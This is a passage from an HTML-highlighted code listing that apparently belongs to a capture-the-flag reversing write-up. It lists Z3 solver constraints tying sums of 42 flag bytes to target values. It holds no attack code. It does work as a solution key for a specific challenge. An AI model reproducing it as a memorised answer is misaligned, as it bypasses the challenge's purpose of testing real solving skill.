class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">22</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">23</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]-flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]+flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">24</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]-flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">25</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]-flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">26</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]-flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]-flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">27</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]+flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">28</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">2</span>]-flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]-flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">29</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">30</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">31</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]+flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">32</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]-flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">33</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]-flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]-flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">34</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]-flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]+flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]+flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">35</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]-flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]+flag[<span class="hljs-number">15</span>]+flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]-flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]+flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]-flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">36</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]-flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]+flag[<span class="hljs-number">10</span>]-flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]-flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]+flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]-flag[<span class="hljs-number">20</span>]-flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]-flag[<span class="hljs-number">25</span>]-flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]-flag[<span class="hljs-number">34</span>]+flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]-flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">37</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">1</span>]+flag[<span class="hljs-number">2</span>]+flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]+flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]-flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]+flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]-flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]-flag[<span class="hljs-number">18</span>]-flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]-flag[<span class="hljs-number">22</span>]+flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]-flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]-flag[<span class="hljs-number">32</span>]-flag[<span class="hljs-number">33</span>]+flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]-flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]+flag[<span class="hljs-number">40</span>]-flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">38</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]-flag[<span class="hljs-number">2</span>]-flag[<span class="hljs-number">3</span>]-flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]-flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]-flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]+flag[<span class="hljs-number">11</span>]-flag[<span class="hljs-number">12</span>]+flag[<span class="hljs-number">13</span>]+flag[<span class="hljs-number">14</span>]-flag[<span class="hljs-number">15</span>]-flag[<span class="hljs-number">16</span>]-flag[<span class="hljs-number">17</span>]+flag[<span class="hljs-number">18</span>]+flag[<span class="hljs-number">19</span>]+flag[<span class="hljs-number">20</span>]+flag[<span class="hljs-number">21</span>]+flag[<span class="hljs-number">22</span>]-flag[<span class="hljs-number">23</span>]+flag[<span class="hljs-number">24</span>]+flag[<span class="hljs-number">25</span>]+flag[<span class="hljs-number">26</span>]+flag[<span class="hljs-number">27</span>]+flag[<span class="hljs-number">28</span>]-flag[<span class="hljs-number">29</span>]+flag[<span class="hljs-number">30</span>]+flag[<span class="hljs-number">31</span>]+flag[<span class="hljs-number">32</span>]+flag[<span class="hljs-number">33</span>]+flag[<span class="hljs-number">34</span>]-flag[<span class="hljs-number">35</span>]-flag[<span class="hljs-number">36</span>]+flag[<span class="hljs-number">37</span>]+flag[<span class="hljs-number">38</span>]+flag[<span class="hljs-number">39</span>]-flag[<span class="hljs-number">40</span>]+flag[<span class="hljs-number">41</span>]==s[<span class="hljs-number">39</span>])<br><span class="hljs-attribute">solver</span>.add(flag[<span class="hljs-number">0</span>]-flag[<span class="hljs-number">1</span>]-flag[<span class="hljs-number">2</span>]-flag[<span class="hljs-number">3</span>]+flag[<span class="hljs-number">4</span>]+flag[<span class="hljs-number">5</span>]+flag[<span class="hljs-number">6</span>]-flag[<span class="hljs-number">7</span>]+flag[<span class="hljs-number">8</span>]+flag[<span class="hljs-number">9</span>]-flag[<span class="hljs-number">10</span>]+flag[<span 